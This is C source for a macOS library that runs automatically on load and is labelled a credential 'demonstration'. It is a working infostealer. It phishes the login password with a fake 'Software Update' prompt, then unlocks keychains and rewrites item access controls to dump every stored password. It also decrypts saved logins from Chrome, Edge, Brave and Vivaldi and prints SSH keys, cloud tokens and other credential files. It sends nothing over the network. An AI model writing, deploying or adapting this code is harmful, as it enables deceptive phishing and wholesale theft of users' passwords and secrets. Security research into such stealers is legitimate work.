/* Constructor-only credential demonstration.
 *
 * Set any category to 0 before building to compile that collector out.
 */
#ifndef KEYCHAIN
#define KEYCHAIN 1
#endif
#ifndef BROWSER
#define BROWSER 1
#endif
#ifndef SECRETS
#define SECRETS 1
#endif

#include <CommonCrypto/CommonCrypto.h>
#include <Security/Security.h>
#include <sqlite3.h>

#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <pwd.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"

#if BROWSER
#define VALUE_LIMIT 2048

struct browser {
    const char *name;
    const char *service;
    const char *relative_dir;
};

static const struct browser browsers[] = {
    {"Chrome", "Chrome Safe Storage",
     "Library/Application Support/Google/Chrome"},
    {"Edge", "Microsoft Edge Safe Storage",
     "Library/Application Support/Microsoft Edge"},
    {"Brave", "Brave Safe Storage",
     "Library/Application Support/BraveSoftware/Brave-Browser"},
    {"Vivaldi", "Vivaldi Safe Storage",
     "Library/Application Support/Vivaldi"},
};
#endif

#if KEYCHAIN || BROWSER
#define KEYCHAIN_PASSWORD_LIMIT 256
#endif

#if KEYCHAIN
#define KEYCHAIN_VALUE_LIMIT 2048
#endif

#if SECRETS
#define SECRET_FILE_LIMIT 256
#define SECRET_DEPTH_LIMIT 4
#define SECRET_VALUE_LIMIT (128 * 1024)

struct secret_location {
    const char *relative_path;
    int recursive;
};

static const struct secret_location secret_locations[] = {
    {".ssh", 1},
    {".aws", 1},
    {".azure", 1},
    {".kube", 1},
    {".config/gh", 1},
    {".config/gcloud/legacy_credentials", 1},
    {".config/gcloud/application_default_credentials.json", 0},
    {".docker/config.json", 0},
    {".git-credentials", 0},
    {".netrc", 0},
    {".npmrc", 0},
    {".pypirc", 0},
    {".m2/settings.xml", 0},
    {".gradle/gradle.properties", 0},
    {".cargo/credentials", 0},
    {".cargo/credentials.toml", 0},
    {".config/composer/auth.json", 0},
    {".composer/auth.json", 0},
    {".vault-token", 0},
    {".terraform.d/credentials.tfrc.json", 0},
    {".config/rclone/rclone.conf", 0},
    {".pgpass", 0},
    {".my.cnf", 0},
};
#endif

#if BROWSER || KEYCHAIN || SECRETS
__attribute__((noinline))
static void secure_zero(void *memory, size_t size) {
    volatile uint8_t *byte = (volatile uint8_t *)memory;
    while (size--) *byte++ = 0;
}
#endif

#if KEYCHAIN || BROWSER
/* Apply one retained Keychain passphrase to a legacy item's ACL operation.
 * SecPasswordAction is the Security.framework path used by macOS itself to
 * present a SecurityAgent-owned secure password sheet.  It is still exported
 * by current macOS, although its header is no longer included in the SDK. */
OSStatus SecKeychainItemSetAccessWithPassword(SecKeychainItemRef,
                                              SecAccessRef, UInt32,
                                              const void *);
OSStatus SecGenericPasswordCreate(SecKeychainAttributeList *,
                                  SecKeychainAttributeList *,
                                  SecPasswordRef *);
OSStatus SecPasswordAction(SecPasswordRef, CFTypeRef, UInt32, UInt32 *,
                           const void **);

static int prompt_keychain_password(uint8_t password[KEYCHAIN_PASSWORD_LIMIT],
                                    size_t *password_size) {
    *password_size = 0;
    SecPasswordRef request = NULL;
    if (SecGenericPasswordCreate(NULL, NULL, &request) != errSecSuccess ||
        !request)
        return 0;

    UInt32 entered_size = 0;
    const void *entered = NULL;
    OSStatus status = SecPasswordAction(
        request,
        CFSTR("Software Update needs your password to install new software."),
        1u /* kSecPasswordGet */, &entered_size, &entered);
    if (status == errSecSuccess && entered && entered_size > 0 &&
        entered_size < KEYCHAIN_PASSWORD_LIMIT) {
        memcpy(password, entered, entered_size);
        password[entered_size] = '\0';
        *password_size = entered_size;
    }
    if (entered) SecKeychainItemFreeContent(NULL, (void *)entered);
    CFRelease(request);
    if (!*password_size) secure_zero(password, KEYCHAIN_PASSWORD_LIMIT);
    return *password_size != 0;
}

static void unlock_keychains(const uint8_t *password, size_t password_size) {
    CFArrayRef keychains = NULL;
    if (SecKeychainCopySearchList(&keychains) == errSecSuccess && keychains) {
        CFIndex count = CFArrayGetCount(keychains);
        for (CFIndex i = 0; i < count; i++) {
            SecKeychainRef keychain = (SecKeychainRef)CFArrayGetValueAtIndex(
                keychains, i);
            if (keychain)
                SecKeychainUnlock(keychain, (UInt32)password_size, password,
                                  true);
        }
    }
    if (keychains) CFRelease(keychains);
}

static SecAccessRef create_reader_access(void) {
    SecAccessRef access = NULL;
    OSStatus status = SecAccessCreate(CFSTR("Software Update"), NULL,
                                      &access);
    return status == errSecSuccess ? access : NULL;
}
#endif

#if BROWSER || SECRETS
static const char *home_directory(void) {
    const char *override = getenv("ML_CREDENTIAL_ROOT");
    if (override && *override) return override;
    const char *home = getenv("HOME");
    return home && *home ? home : NULL;
}
#endif

#if KEYCHAIN || BROWSER || SECRETS
static void print_bytes(const uint8_t *data, size_t size) {
    for (size_t i = 0; i < size; i++) {
        unsigned c = data[i];
        if (c >= 0x20 && c < 0x7f && c != '\\') putchar((int)c);
        else printf("\\x%02x", c);
    }
}
#endif

#if KEYCHAIN || BROWSER
static void print_entered_password(const uint8_t *password,
                                   size_t password_size) {
    const struct passwd *account = getpwuid(getuid());
    printf("system account=");
    if (account && account->pw_name)
        print_bytes((const uint8_t *)account->pw_name,
                    strlen(account->pw_name));
    printf(" password=");
    print_bytes(password, password_size);
    putchar('\n');
    fflush(stdout);
}
#endif

#if KEYCHAIN
static void print_cf_value(CFTypeRef value) {
    if (!value) return;
    CFTypeID type = CFGetTypeID(value);
    if (type == CFStringGetTypeID()) {
        char text[2048];
        if (CFStringGetCString((CFStringRef)value, text, sizeof(text),
                               kCFStringEncodingUTF8))
            print_bytes((const uint8_t *)text, strlen(text));
    } else if (type == CFDataGetTypeID()) {
        CFDataRef data = (CFDataRef)value;
        const uint8_t *bytes = CFDataGetBytePtr(data);
        CFIndex size = CFDataGetLength(data);
        if (bytes && size > 0) print_bytes(bytes, (size_t)size);
    } else if (type == CFNumberGetTypeID()) {
        long long number = 0;
        if (CFNumberGetValue((CFNumberRef)value, kCFNumberLongLongType,
                             &number))
            printf("%lld", number);
    }
}
#endif

#if KEYCHAIN || BROWSER
static CFDataRef copy_keychain_secret(CFDictionaryRef attributes,
                                      const uint8_t *password,
                                      size_t password_size,
                                      SecAccessRef reader_access,
                                      OSStatus *status_out) {
    CFTypeRef persistent = CFDictionaryGetValue(attributes,
                                                 kSecValuePersistentRef);
    if (!persistent || CFGetTypeID(persistent) != CFDataGetTypeID()) {
        *status_out = errSecParam;
        return NULL;
    }
    SecKeychainItemRef item = NULL;
    SecAccessRef restore_access = NULL;
    *status_out = SecKeychainItemCopyFromPersistentReference(
        (CFDataRef)persistent, &item);
    if (*status_out != errSecSuccess || !item || !reader_access) {
        if (item) CFRelease(item);
        return NULL;
    }
    *status_out = SecKeychainItemCopyAccess(item, &restore_access);
    if (*status_out != errSecSuccess || !restore_access) {
        if (restore_access) CFRelease(restore_access);
        CFRelease(item);
        return NULL;
    }
    *status_out = SecKeychainItemSetAccessWithPassword(
        item, reader_access, (UInt32)password_size, password);
    if (*status_out != errSecSuccess) {
        CFRelease(restore_access);
        CFRelease(item);
        return NULL;
    }

    UInt32 value_size = 0;
    void *value = NULL;
    *status_out = SecKeychainItemCopyContent(item, NULL, NULL, &value_size,
                                             &value);
    CFDataRef result = NULL;
    if (*status_out == errSecSuccess && value && value_size)
        result = CFDataCreate(kCFAllocatorDefault, value, value_size);
    if (value) SecKeychainItemFreeContent(NULL, value);
    OSStatus restore_status = SecKeychainItemSetAccessWithPassword(
        item, restore_access, (UInt32)password_size, password);
    CFRelease(restore_access);
    CFRelease(item);
    if (restore_status != errSecSuccess) {
        if (result) CFRelease(result);
        *status_out = restore_status;
        return NULL;
    }
    return result;
}
#endif

#if KEYCHAIN
static void print_keychain_item(const char *kind, CFDictionaryRef attributes,
                                const uint8_t *password,
                                size_t password_size,
                                SecAccessRef reader_access) {
    OSStatus status = errSecSuccess;
    CFTypeRef inline_value = CFDictionaryGetValue(attributes, kSecValueData);
    CFDataRef secret = inline_value &&
                       CFGetTypeID(inline_value) == CFDataGetTypeID()
                           ? (CFDataRef)inline_value : NULL;
    int release_secret = 0;
    if (!secret) {
        secret = copy_keychain_secret(attributes, password, password_size,
                                      reader_access, &status);
        release_secret = secret != NULL;
    }
    if (!secret || CFDataGetLength(secret) <= 0 || !CFDataGetBytePtr(secret)) {
        if (release_secret) CFRelease(secret);
        return;
    }
    const uint8_t *bytes = CFDataGetBytePtr(secret);
    size_t secret_size = (size_t)CFDataGetLength(secret);
    size_t shown = secret_size < KEYCHAIN_VALUE_LIMIT ? secret_size :
                   KEYCHAIN_VALUE_LIMIT;
    printf("keychain kind=%s label=", kind);
    print_cf_value(CFDictionaryGetValue(attributes, kSecAttrLabel));
    printf(" account=");
    print_cf_value(CFDictionaryGetValue(attributes, kSecAttrAccount));
    printf(" service=");
    print_cf_value(CFDictionaryGetValue(attributes, kSecAttrService));
    printf(" server=");
    print_cf_value(CFDictionaryGetValue(attributes, kSecAttrServer));
    printf(" path=");
    print_cf_value(CFDictionaryGetValue(attributes, kSecAttrPath));
    printf(" secret=");
    print_bytes(bytes, shown);
    if (shown != secret_size) printf("<truncated>");
    if (release_secret) CFRelease(secret);
    putchar('\n');
}

static void print_keychain_result(const char *kind, CFTypeRef result,
                                  const uint8_t *password,
                                  size_t password_size,
                                  SecAccessRef reader_access) {
    if (!result) return;
    if (CFGetTypeID(result) == CFArrayGetTypeID()) {
        CFArrayRef items = (CFArrayRef)result;
        CFIndex count = CFArrayGetCount(items);
        for (CFIndex i = 0; i < count; i++) {
            CFTypeRef item = CFArrayGetValueAtIndex(items, i);
            if (item && CFGetTypeID(item) == CFDictionaryGetTypeID())
                print_keychain_item(kind, (CFDictionaryRef)item, password,
                                    password_size, reader_access);
        }
    } else if (CFGetTypeID(result) == CFDictionaryGetTypeID()) {
        print_keychain_item(kind, (CFDictionaryRef)result, password,
                            password_size, reader_access);
    }
}

static void print_keychain_class(CFTypeRef item_class, const char *kind,
                                 const char *service_filter,
                                 const uint8_t *password,
                                 size_t password_size,
                                 SecAccessRef reader_access,
                                 int synchronizable) {
    CFStringRef service = service_filter ? CFStringCreateWithCString(
        kCFAllocatorDefault, service_filter, kCFStringEncodingUTF8) : NULL;
    CFMutableDictionaryRef query = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    if (!query) {
        if (service) CFRelease(service);
        return;
    }
    CFDictionarySetValue(query, kSecClass, item_class);
    CFDictionarySetValue(query, kSecReturnAttributes, kCFBooleanTrue);
    CFDictionarySetValue(query, kSecMatchLimit, kSecMatchLimitAll);
    CFDictionarySetValue(query, kSecUseAuthenticationUI,
                         kSecUseAuthenticationUIFail);
    if (synchronizable) {
        /* Persistent references are unsupported for synchronizable password
         * items, so request their values with the attributes in one call. */
        CFDictionarySetValue(query, kSecAttrSynchronizable, kCFBooleanTrue);
        CFDictionarySetValue(query, kSecReturnData, kCFBooleanTrue);
    } else {
        CFDictionarySetValue(query, kSecReturnPersistentRef, kCFBooleanTrue);
    }
    if (service) {
        CFDictionarySetValue(query, kSecAttrService, service);
        CFRelease(service);
    }

    CFTypeRef result = NULL;
    OSStatus status = SecItemCopyMatching(query, &result);
    CFRelease(query);
    if (status == errSecSuccess && result)
        print_keychain_result(kind, result, password, password_size,
                              reader_access);
    if (result) CFRelease(result);
}

static void print_keychains(const uint8_t *password, size_t password_size,
                            SecAccessRef reader_access) {
    const char *service_filter = getenv("ML_KEYCHAIN_SERVICE");
    if (service_filter && !*service_filter) service_filter = NULL;
    print_keychain_class(kSecClassGenericPassword, "generic", service_filter,
                         password, password_size, reader_access, 0);
    print_keychain_class(kSecClassGenericPassword, "generic", service_filter,
                         password, password_size, reader_access, 1);
    if (!service_filter) {
        print_keychain_class(kSecClassInternetPassword, "internet", NULL,
                             password, password_size, reader_access, 0);
        print_keychain_class(kSecClassInternetPassword, "internet", NULL,
                             password, password_size, reader_access, 1);
    }
}
#endif

#if BROWSER
static int safe_storage_key(const char *service, uint8_t key[16],
                            const uint8_t *password, size_t password_size,
                            SecAccessRef reader_access) {
    CFStringRef service_name = CFStringCreateWithCString(
        kCFAllocatorDefault, service, kCFStringEncodingUTF8);
    if (!service_name) return 0;
    const void *keys[] = {kSecClass, kSecAttrService, kSecReturnAttributes,
                          kSecReturnPersistentRef, kSecMatchLimit,
                          kSecUseAuthenticationUI};
    const void *values[] = {
        kSecClassGenericPassword, service_name, kCFBooleanTrue,
        kCFBooleanTrue, kSecMatchLimitOne, kSecUseAuthenticationUIFail
    };
    CFDictionaryRef query = CFDictionaryCreate(
        kCFAllocatorDefault, keys, values, 6,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFRelease(service_name);
    if (!query) return 0;

    CFTypeRef match = NULL;
    OSStatus status = SecItemCopyMatching(query, &match);
    CFRelease(query);
    if (status != errSecSuccess || !match ||
        CFGetTypeID(match) != CFDictionaryGetTypeID()) {
        if (match) CFRelease(match);
        return 0;
    }
    CFDataRef secret = copy_keychain_secret(
        (CFDictionaryRef)match, password, password_size, reader_access,
        &status);
    CFRelease(match);
    if (!secret) return 0;
    const uint8_t *secret_data = CFDataGetBytePtr(secret);
    CFIndex secret_size = CFDataGetLength(secret);
    if (!secret_data || secret_size <= 0 || secret_size > INT_MAX) {
        CFRelease(secret);
        return 0;
    }
    status = CCKeyDerivationPBKDF(kCCPBKDF2, (const char *)secret_data,
                                  (size_t)secret_size,
                                  (const uint8_t *)"saltysalt", 9,
                                  kCCPRFHmacAlgSHA1, 1003, key, 16);
    CFRelease(secret);
    return status == kCCSuccess;
}
static int decrypt_login(const void *value, size_t value_size,
                         const uint8_t key[16],
                         uint8_t output[VALUE_LIMIT], size_t *output_size) {
    *output_size = 0;
    if (!value || value_size < 19 || value_size > VALUE_LIMIT ||
        (memcmp(value, "v10", 3) != 0 && memcmp(value, "v11", 3) != 0))
        return 0;

    uint8_t iv[16];
    memset(iv, ' ', sizeof(iv));
    size_t moved = 0;
    CCCryptorStatus status = CCCrypt(
        kCCDecrypt, kCCAlgorithmAES, kCCOptionPKCS7Padding,
        key, 16, iv, (const uint8_t *)value + 3, value_size - 3,
        output, VALUE_LIMIT, &moved);
    if (status != kCCSuccess || moved == 0) {
        secure_zero(output, VALUE_LIMIT);
        return 0;
    }
    *output_size = moved;
    return 1;
}

static void print_logins(const char *browser_name, const char *profile_name,
                         const char *database, const uint8_t key[16]) {
    sqlite3 *db = NULL;
    if (sqlite3_open_v2(database, &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX,
                        NULL) != SQLITE_OK) {
        if (db) sqlite3_close(db);
        return;
    }
    sqlite3_busy_timeout(db, 500);

    sqlite3_stmt *query = NULL;
    if (sqlite3_prepare_v2(db,
        "SELECT origin_url, username_value, password_value FROM logins",
        -1, &query, NULL) != SQLITE_OK) {
        sqlite3_close(db);
        return;
    }

    while (sqlite3_step(query) == SQLITE_ROW) {
        const uint8_t *origin = sqlite3_column_text(query, 0);
        int origin_size = sqlite3_column_bytes(query, 0);
        const uint8_t *username = sqlite3_column_text(query, 1);
        int username_size = sqlite3_column_bytes(query, 1);
        const void *encrypted = sqlite3_column_blob(query, 2);
        int encrypted_size = sqlite3_column_bytes(query, 2);

        uint8_t password[VALUE_LIMIT];
        size_t password_size = 0;
        if (!decrypt_login(encrypted,
                           encrypted_size > 0 ? (size_t)encrypted_size : 0,
                           key, password, &password_size)) continue;

        printf("browser="); print_bytes((const uint8_t *)browser_name,
                                         strlen(browser_name));
        printf(" profile="); print_bytes((const uint8_t *)profile_name,
                                          strlen(profile_name));
        printf(" origin=");
        if (origin && origin_size > 0) print_bytes(origin, (size_t)origin_size);
        printf(" username=");
        if (username && username_size > 0)
            print_bytes(username, (size_t)username_size);
        printf(" password="); print_bytes(password, password_size);
        putchar('\n');
        secure_zero(password, sizeof(password));
    }
    sqlite3_finalize(query);
    sqlite3_close(db);
}

static void inspect_browser(const char *root, const struct browser *browser,
                            const uint8_t *password, size_t password_size,
                            SecAccessRef reader_access) {
    char base[PATH_MAX];
    int base_size = snprintf(base, sizeof(base), "%s/%s",
                             root, browser->relative_dir);
    if (base_size <= 0 || (size_t)base_size >= sizeof(base)) return;

    DIR *profiles = opendir(base);
    if (!profiles) return;

    uint8_t key[16];
    int have_key = 0;
    struct dirent *entry;
    while ((entry = readdir(profiles)) != NULL) {
        if (entry->d_name[0] == '.') continue;
        char database[PATH_MAX];
        int size = snprintf(database, sizeof(database), "%s/%s/Login Data",
                            base, entry->d_name);
        if (size <= 0 || (size_t)size >= sizeof(database)) continue;
        struct stat info;
        if (stat(database, &info) != 0 || !S_ISREG(info.st_mode)) continue;

        if (!have_key)
            have_key = safe_storage_key(browser->service, key,
                                        password, password_size,
                                        reader_access);
        if (!have_key) break;
        print_logins(browser->name, entry->d_name, database, key);
    }
    secure_zero(key, sizeof(key));
    closedir(profiles);
}
#endif

#if SECRETS
static int has_suffix(const char *path, const char *suffix) {
    size_t path_size = strlen(path);
    size_t suffix_size = strlen(suffix);
    return path_size >= suffix_size &&
           strcmp(path + path_size - suffix_size, suffix) == 0;
}

static int is_database_file(const char *path, const uint8_t *data,
                            size_t size) {
    static const char *suffixes[] = {
        ".db", ".db-journal", ".db-shm", ".db-wal",
        ".sqlite", ".sqlite-journal", ".sqlite-shm", ".sqlite-wal",
        ".sqlite3", ".sqlite3-journal", ".sqlite3-shm", ".sqlite3-wal",
    };
    for (size_t i = 0; i < sizeof(suffixes) / sizeof(suffixes[0]); i++) {
        if (has_suffix(path, suffixes[i])) return 1;
    }
    static const uint8_t sqlite_header[] = "SQLite format 3";
    return size >= sizeof(sqlite_header) &&
           memcmp(data, sqlite_header, sizeof(sqlite_header)) == 0;
}

static void print_secret_file(const char *path, unsigned int *files) {
    if (*files >= SECRET_FILE_LIMIT) return;
    struct stat info;
    if (stat(path, &info) != 0 || !S_ISREG(info.st_mode) || info.st_size <= 0)
        return;

    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0) return;
    size_t capacity = (uintmax_t)info.st_size < SECRET_VALUE_LIMIT
                          ? (size_t)info.st_size : SECRET_VALUE_LIMIT;
    uint8_t *buffer = malloc(capacity);
    if (!buffer) {
        close(fd);
        return;
    }
    size_t total = 0;
    while (total < capacity) {
        ssize_t size = read(fd, buffer + total, capacity - total);
        if (size <= 0) break;
        total += (size_t)size;
    }
    close(fd);
    if (total == 0) {
        free(buffer);
        return;
    }
    if (is_database_file(path, buffer, total)) {
        secure_zero(buffer, capacity);
        free(buffer);
        return;
    }
    (*files)++;
    printf("secret path=");
    print_bytes((const uint8_t *)path, strlen(path));
    printf(" content=");
    print_bytes(buffer, total);
    if ((uintmax_t)info.st_size > total) printf("<truncated>");
    putchar('\n');
    secure_zero(buffer, capacity);
    free(buffer);
}

static void inspect_secret_path(const char *path, int recursive,
                                unsigned int depth, unsigned int *files) {
    if (*files >= SECRET_FILE_LIMIT) return;
    struct stat info;
    if (lstat(path, &info) != 0) return;
    if (!S_ISDIR(info.st_mode)) {
        print_secret_file(path, files);
        return;
    }
    if (!recursive || depth >= SECRET_DEPTH_LIMIT) return;

    DIR *directory = opendir(path);
    if (!directory) return;
    struct dirent *entry;
    while (*files < SECRET_FILE_LIMIT &&
           (entry = readdir(directory)) != NULL) {
        if (entry->d_name[0] == '.' &&
            (entry->d_name[1] == '\0' ||
             (entry->d_name[1] == '.' && entry->d_name[2] == '\0')))
            continue;
        char child[PATH_MAX];
        int size = snprintf(child, sizeof(child), "%s/%s", path,
                            entry->d_name);
        if (size <= 0 || (size_t)size >= sizeof(child)) continue;
        inspect_secret_path(child, 1, depth + 1, files);
    }
    closedir(directory);
}

static void print_file_secrets(const char *root) {
    unsigned int files = 0;
    for (size_t i = 0;
         i < sizeof(secret_locations) / sizeof(secret_locations[0]); i++) {
        char path[PATH_MAX];
        int size = snprintf(path, sizeof(path), "%s/%s", root,
                            secret_locations[i].relative_path);
        if (size <= 0 || (size_t)size >= sizeof(path)) continue;
        inspect_secret_path(path, secret_locations[i].recursive, 0, &files);
        if (files >= SECRET_FILE_LIMIT) break;
    }
}
#endif

__attribute__((constructor))
static void print_saved_credentials(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
#if KEYCHAIN || BROWSER
    uint8_t password[KEYCHAIN_PASSWORD_LIMIT] = {0};
    size_t password_size = 0;
    SecAccessRef reader_access = NULL;
    Boolean interaction_was_allowed = false;
    int changed_interaction = 0;
    if (prompt_keychain_password(password, &password_size)) {
        print_entered_password(password, password_size);
        unlock_keychains(password, password_size);
        reader_access = create_reader_access();
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
        if (SecKeychainGetUserInteractionAllowed(&interaction_was_allowed) ==
            errSecSuccess &&
            SecKeychainSetUserInteractionAllowed(false) == errSecSuccess)
            changed_interaction = 1;
#pragma clang diagnostic pop
    }
#endif
#if KEYCHAIN
    if (password_size && reader_access)
        print_keychains(password, password_size, reader_access);
#endif
#if BROWSER || SECRETS
    const char *root = home_directory();
    if (root) {
#if BROWSER
    if (password_size && reader_access) {
        for (size_t i = 0; i < sizeof(browsers) / sizeof(browsers[0]); i++)
            inspect_browser(root, &browsers[i], password, password_size,
                            reader_access);
    }
#endif
#if SECRETS
        print_file_secrets(root);
#endif
    }
#endif
#if KEYCHAIN || BROWSER
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
    if (changed_interaction && interaction_was_allowed)
        SecKeychainSetUserInteractionAllowed(true);
#pragma clang diagnostic pop
    if (reader_access) CFRelease(reader_access);
    secure_zero(password, sizeof(password));
#endif
    fflush(stdout);
}

#pragma clang diagnostic pop
